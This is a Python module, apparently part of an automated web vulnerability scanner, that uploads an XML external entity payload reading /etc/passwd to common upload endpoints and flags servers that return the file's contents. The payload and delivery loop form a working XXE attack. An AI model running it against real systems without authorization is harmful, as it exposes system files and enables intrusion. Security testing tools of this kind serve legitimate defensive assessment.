from ..http_engine import HTTPEngine

class XXEUploadSkill:
    def __init__(self):
        self.name = "XXE / File Upload"
        # Common endpoints where file uploads happen
        self.upload_endpoints = [
            "/file-upload",
            "/api/upload",
            "/upload",
            "/api/file-upload"
        ]
        
        # The XXE payload
        self.xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>"""

    async def run(self, base_url: str, engine: HTTPEngine) -> list:
        findings = []
        root_url = base_url.rstrip('/')
        
        for endpoint in self.upload_endpoints:
            test_url = f"{root_url}{endpoint}"
            
            # Create a multipart/form-data payload
            files = {
                'file': ('payload.xml', self.xxe_payload, 'application/xml')
            }
            
            # Send the upload request
            response = await engine.request("POST", test_url, files=files)
            
            if not response:
                continue
                
            # Validation: If the server returns 200/201 and reflects the /etc/passwd content, it's a confirmed XXE
            if response.status_code in [200, 201]:
                if "root:x:0:0" in response.text:
                    poc = f"Upload this XML file to {test_url}:\n\n{self.xxe_payload}\n\nThe server will return the /etc/passwd file."
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Confirmed XXE via File Upload",
                        "severity": "Critical",
                        "evidence": f"Successfully read /etc/passwd using XXE payload.",
                        "poc": poc
                    })
                # If it just accepts the file, it's a potential Unrestricted File Upload
                elif "success" in response.text.lower() or "uploaded" in response.text.lower():
                     poc = f"Upload this XML file to {test_url}:\n\n{self.xxe_payload}"
                     findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Potential Unrestricted File Upload",
                        "severity": "High",
                        "evidence": f"Server accepted an XML file upload without obvious filtering.",
                        "poc": poc
                    })
                    
        return findings
